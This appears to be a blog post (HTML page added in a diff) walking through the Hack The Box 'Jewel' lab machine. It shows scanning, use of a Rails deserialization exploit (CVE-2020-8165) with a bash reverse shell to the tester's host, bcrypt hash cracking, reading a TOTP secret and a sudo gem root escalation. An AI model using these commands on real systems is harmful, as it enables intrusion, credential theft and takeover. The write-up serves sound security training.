@@ -1,0 +1,716 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="123456789101112131415161718192021222324Nmap 7.92 scan initiated Sun Apr 10 13:17:04 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 10.10.10.211Nmap scan report for 10.10.10.211Host is up (0.17s latenc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Jewel">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Jewel.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="123456789101112131415161718192021222324Nmap 7.92 scan initiated Sun Apr 10 13:17:04 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 10.10.10.211Nmap scan report for 10.10.10.211Host is up (0.17s latenc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410140344132.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410140400741.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410152614257.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410164449160.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410164617835.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.016Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.032Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410140344132.png">
+  
+  
+  
+  <title>HTB Walkthrough - Jewel - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Jewel"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Jewel</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Nmap 7.92 scan initiated Sun Apr 10 13:17:04 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 10.10.10.211</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.211</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)</span><br><span class="line">|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)</span><br><span class="line">|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)</span><br><span class="line">8000/tcp open  http    Apache httpd 2.4.38</span><br><span class="line">|_http-generator: gitweb/2.20.1 git/2.20.1</span><br><span class="line">| http-title: 10.10.10.211 Git</span><br><span class="line">|_Requested resource was http://10.10.10.211:8000/gitweb/</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)</span><br><span class="line">|_http-title: BL0G!</span><br><span class="line">|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6</span><br><span class="line">Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun Apr 10 13:20:33 2022 -- 1 IP address (1 host up) scanned in 209.10 seconds</span></span><br></pre></td></tr></table></figure>
+
+<p>22端口用户名枚举漏洞，先跳过。8000端口Apache httpd 2.4.38，8080端口nginx 1.14.2 (Phusion Passenger 6.0.6)，</p>
+<p>8000：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410140344132.png" srcset="/img/loading.gif" lazyload alt="image-20220410140344132"  />
+
+<p>8080：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410140400741.png" srcset="/img/loading.gif" lazyload alt="image-20220410140400741"  />
+
+<p>在两个web页面中来回探索，我发现了一个bill(比尔)的用户，这或许是一个潜在的用户名，然后我误打误撞找到了以下页面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.211:8000/gitweb/?p=.git;a=commitdiff_plain;h=HEAD</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410152614257.png" srcset="/img/loading.gif" lazyload alt="image-20220410152614257"  />
+
+<p>这就足以让我锁定一个CVE漏洞了：</p>
+<p>Ruby on Rails 反序列化远程代码执行漏洞，CVE-2020-8165。</p>
+<p>但是我在网上并没有找到该漏洞的相关说明，或是一笔带过，或是含糊不清。这便是我搜寻了很多资料最终都只有这一句：</p>
+<p>rails &lt; 5.2.4.3、rails &lt; 6.0.3.1 中存在不可信数据漏洞的反序列化，这可能允许攻击者在 MemCacheStore 和 RedisCacheStore 中解组用户提供的对象，从而可能导致 RCE。</p>
+<p>很抱歉这次我也无法研究该漏洞究竟为何产生，因为我也不知道。我只找到了如下漏洞利用脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hybryx/CVE-2020-8165/blob/main/exploit.py</span><br></pre></td></tr></table></figure>
+
+<p>账户可以在以下页面注册：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.211:8080/signup</span><br></pre></td></tr></table></figure>
+
+<p>脚本中我也看不出该漏洞究竟为何，因为它只要求我提供目标ID，我注册的用户口令，目标端口以及要执行的命令。它的利用方法很简单：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py 10.10.10.211 8080 worldisend@qq.com worldisend <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.9/8989 0&gt;&amp;1&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8989                                     </span><br><span class="line">listening on [any] 8989 ...</span><br><span class="line">connect to [10.10.16.9] from (UNKNOWN) [10.10.10.211] 47642</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (792): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bill@jewel:~/blog$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">bill</span><br><span class="line">bill@jewel:~/blog$ </span><br></pre></td></tr></table></figure>
+
+<p>就这样，我稀里糊涂就获得了目标的反向shell，没有漏洞原理，没有反序列化注入点。</p>
+<p>user.txt:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bill@jewel:/home$ <span class="built_in">cd</span> bill                                                                                                                                                                   </span><br><span class="line"><span class="built_in">cd</span> bill                                                                                                                                                                                     </span><br><span class="line">bill@jewel:~$ <span class="built_in">ls</span>                                                                                                                                                                            </span><br><span class="line"><span class="built_in">ls</span>                                                                                                                                                                                          </span><br><span class="line">blog                                                                                                                                                                                        </span><br><span class="line">user.txt</span><br><span class="line">bill@jewel:~$ <span class="built_in">cat</span> user.txt</span><br></pre></td></tr></table></figure>
+
+<p>在备份目录可以看到一堆备份：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">bill@jewel:/var/backups$ <span class="built_in">ls</span> -all</span><br><span class="line"><span class="built_in">ls</span> -all</span><br><span class="line">total 2468</span><br><span class="line">drwxr-xr-x  2 root root     4096 Apr 10 08:26 .</span><br><span class="line">drwxr-xr-x 12 root root     4096 Aug 27  2020 ..</span><br><span class="line">-rw-r--r--  1 root root    81920 Aug 26  2020 alternatives.tar.0</span><br><span class="line">-rw-r--r--  1 root root    51600 Sep 17  2020 apt.extended_states.0</span><br><span class="line">-rw-r--r--  1 root root     5415 Aug 28  2020 apt.extended_states.1.gz</span><br><span class="line">-rw-r--r--  1 root root     5363 Aug 27  2020 apt.extended_states.2.gz</span><br><span class="line">-rw-r--r--  1 root root      252 Aug 26  2020 dpkg.diversions.0</span><br><span class="line">-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.1.gz</span><br><span class="line">-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.2.gz</span><br><span class="line">-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.3.gz</span><br><span class="line">-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.4.gz</span><br><span class="line">-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.5.gz</span><br><span class="line">-rw-r--r--  1 root root      156 Aug 26  2020 dpkg.diversions.6.gz</span><br><span class="line">-rw-r--r--  1 root root      173 Aug 26  2020 dpkg.statoverride.0</span><br><span class="line">-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.1.gz</span><br><span class="line">-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.2.gz</span><br><span class="line">-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.3.gz</span><br><span class="line">-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.4.gz</span><br><span class="line">-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.5.gz</span><br><span class="line">-rw-r--r--  1 root root      158 Aug 26  2020 dpkg.statoverride.6.gz</span><br><span class="line">-rw-r--r--  1 root root   910140 Feb  8  2021 dpkg.status.0</span><br><span class="line">-rw-r--r--  1 root root   227505 Sep 18  2020 dpkg.status.1.gz</span><br><span class="line">-rw-r--r--  1 root root   227505 Sep 18  2020 dpkg.status.2.gz</span><br><span class="line">-rw-r--r--  1 root root   227505 Sep 18  2020 dpkg.status.3.gz</span><br><span class="line">-rw-r--r--  1 root root   227505 Sep 18  2020 dpkg.status.4.gz</span><br><span class="line">-rw-r--r--  1 root root   226834 Sep 17  2020 dpkg.status.5.gz</span><br><span class="line">-rw-r--r--  1 root root   222736 Aug 28  2020 dpkg.status.6.gz</span><br><span class="line">-rw-r--r--  1 root root     7828 Aug 27  2020 dump_2020-08-27.sql</span><br><span class="line">-rw-------  1 root root      763 Aug 27  2020 group.bak</span><br><span class="line">-rw-------  1 root shadow    637 Aug 27  2020 gshadow.bak</span><br><span class="line">-rw-------  1 root root     1670 Aug 26  2020 passwd.bak</span><br><span class="line">-rw-------  1 root shadow   1059 Aug 28  2020 shadow.bak</span><br><span class="line">bill@jewel:/var/backups$ </span><br></pre></td></tr></table></figure>
+
+<p>在dump_2020-08-27.sql中会有两串哈希：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COPY public.users (<span class="built_in">id</span>, username, email, created_at, updated_at, password_digest) FROM stdin;</span><br><span class="line">2       jennifer        jennifer@mail.htb       2020-08-27 05:44:28.551735      2020-08-27 05:44:28.551735      $2a$12<span class="variable">$sZac9R2VSQYjOcBTTUYy6</span>.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO</span><br><span class="line">1       bill    bill@mail.htb   2020-08-26 10:24:03.878232      2020-08-27 09:18:11.636483      $2a$12<span class="variable">$QqfetsTSBVxMXpnTR</span>.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW</span><br></pre></td></tr></table></figure>
+
+<p>jennifer的哈希并没有碰撞出来，但是bill的哈希我碰撞了出来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 3200 ./hash2.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2a$12<span class="variable">$QqfetsTSBVxMXpnTR</span>.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW:spongebob</span><br></pre></td></tr></table></figure>
+
+<p>我可以尝试一下sudo -l，它会报错：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo: no <span class="built_in">tty</span> present and no askpass program specified</span><br></pre></td></tr></table></figure>
+
+<p>我可以升级一下shell解决这个问题：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bill@jewel:/var$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> bill: spongebob</span><br><span class="line"></span><br><span class="line">Verification code: </span><br></pre></td></tr></table></figure>
+
+<p>好吧，看起来它还需要另一种验证，我记得我之前在用户根目录发现过这个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r--------  1 bill bill   56 Aug 28  2020 .google_authenticator</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bill@jewel:~$ <span class="built_in">cat</span> .google_authenticator</span><br><span class="line"><span class="built_in">cat</span> .google_authenticator</span><br><span class="line">2UQI3R52WFCLE6JTLDCSJYMJH4</span><br><span class="line"><span class="string">&quot; WINDOW_SIZE 17</span></span><br><span class="line"><span class="string">&quot;</span> TOTP_AUTH</span><br><span class="line">bill@jewel:~$ </span><br></pre></td></tr></table></figure>
+
+<p>我觉得它像是在为Google打广告，可以到Google浏览器下载GAuth Authenticator插件。然后输入：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410164449160.png" srcset="/img/loading.gif" lazyload alt="image-20220410164449160"  />
+
+<p>我就会拥有一个类似于QQ安全中心的动态六位验证码，每过十几秒就会刷新一次：</p>
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220410164617835.png" srcset="/img/loading.gif" lazyload alt="image-20220410164617835"  />
+
+<p>然后我就可以成功的使用sudo了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bill@jewel:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> bill: </span><br><span class="line"></span><br><span class="line">I think ... err ... I think ... I think I<span class="string">&#x27;ll go home</span></span><br><span class="line"><span class="string">[sudo] password for bill: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I feel much better now.</span></span><br><span class="line"><span class="string">[sudo] password for bill: spongebob</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Verification code: 627125</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Matching Defaults entries for bill on jewel:</span></span><br><span class="line"><span class="string">    env_reset, mail_badpass,</span></span><br><span class="line"><span class="string">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span></span><br><span class="line"><span class="string">    insults</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User bill may run the following commands on jewel:</span></span><br><span class="line"><span class="string">    (ALL : ALL) /usr/bin/gem</span></span><br><span class="line"><span class="string">bill@jewel:~$ </span></span><br></pre></td></tr></table></figure>
+
+<p>但是我sudo也只能使用&#x2F;usr&#x2F;bin&#x2F;gem。我从以下网址中获取到了gem的使用信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gtfobins.github.io/gtfobins/gem/</span><br></pre></td></tr></table></figure>
+
+<p>我可以这样：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/gem open -e <span class="string">&quot;/bin/sh -c /bin/sh&quot;</span> rdoc</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bill@jewel:~$ sudo /usr/bin/gem open -e <span class="string">&quot;/bin/sh -c /bin/sh&quot;</span> rdoc                            </span><br><span class="line">sudo /usr/bin/gem open -e <span class="string">&quot;/bin/sh -c /bin/sh&quot;</span> rdoc</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>root.txt:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Jewel</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Jewel.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Json.html" title="HTB Walkthrough - Json">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Json</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Jeeves.html" title="HTB Walkthrough - Jeeves">
+                        <span class="hidden-mobile">HTB Walkthrough - Jeeves</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
